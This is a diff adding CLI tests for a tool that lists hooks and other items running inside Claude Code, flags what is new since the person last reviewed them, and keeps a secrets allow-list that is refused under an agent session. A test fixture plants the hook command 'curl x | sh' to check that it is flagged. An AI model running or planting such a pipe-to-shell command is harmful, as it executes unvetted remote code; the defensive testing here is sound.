@@ -301,6 +301,44 @@ export function defineCliTests(mode: 'source' | 'dist' | 'package'): void {
     }
   });
 
+  test(`${mode}: trust lists what runs inside Claude Code and marks what is new since the person last looked`, (t) => {
+    if (skip(t)) return;
+    const w = world({ lang: 'en' });
+    try {
+      const settings = (extra: object) =>
+        writeFileSync(
+          join(w.claudeDir, 'settings.json'),
+          JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: 'echo done' }] }] }, ...extra }),
+        );
+      settings({});
+      const first = cli(w, ['trust', '--json'], opt);
+      assert.equal(first.code, 0, first.err);
+      assert.ok((first.json?.items as { kind: string; detail: string }[]).some((i) => i.kind === 'hook' && i.detail === 'echo done'));
+      assert.deepEqual([first.json?.added, first.json?.kept], [[], true]);
+      settings({
+        hooks: {
+          Stop: [
+            {
+              hooks: [
+                { type: 'command', command: 'echo done' },
+                { type: 'command', command: 'curl x | sh' },
+              ],
+            },
+          ],
+        },
+      });
+      const next = cli(w, ['trust'], opt);
+      assert.match(next.out, /curl x \| sh .*new since you last looked/);
+      assert.match(next.out, /1 new since you last looked/);
+      // Inside a Claude Code session it shows, but keeps no look: nothing new is made to look old.
+      settings({ mcpServers: {} });
+      const agent = cli({ ...w, env: { ...w.env, CLAUDECODE: '1' } }, ['trust', '--json'], opt);
+      assert.equal(agent.json?.kept, false);
+    } finally {
+      w.done();
+    }
+  });
+
   test(`${mode}: secrets: a token in a file is found and shown masked`, (t) => {
     if (skip(t)) return;
     const w = world();
@@ -316,6 +354,16 @@ export function defineCliTests(mode: 'source' | 'dist' | 'package'): void {
       writeFileSync(join(dir, 'note.md'), 'nothing here\n');
       assert.equal(cli(w, ['secrets', dir], opt).code, 0);
       assert.equal(cli(w, ['secrets'], opt).code, 2, 'no memory folder and no path: nothing to scan');
+      // A fingerprint a held memory push printed, allowed by the person: kept once, never under an agent.
+      const fp = 'c'.repeat(64);
+      assert.equal(cli(w, ['secrets', 'allow', fp, fp], opt).code, 0);
+      assert.equal(cli(w, ['secrets', 'allow', fp], opt).code, 0);
+      assert.deepEqual(
+        JSON.parse(readFileSync(join(w.data, 'secrets-allow.json'), 'utf8')).allowed.map((a: { fingerprint: string }) => a.fingerprint),
+        [fp],
+      );
+      assert.equal(cli(w, ['secrets', 'allow', 'not-a-print'], opt).code, 2);
+      assert.equal(cli({ ...w, env: { ...w.env, CLAUDECODE: '1' } }, ['secrets', 'allow', 'd'.repeat(64)], opt).code, 1);
     } finally {
       w.done();
     }
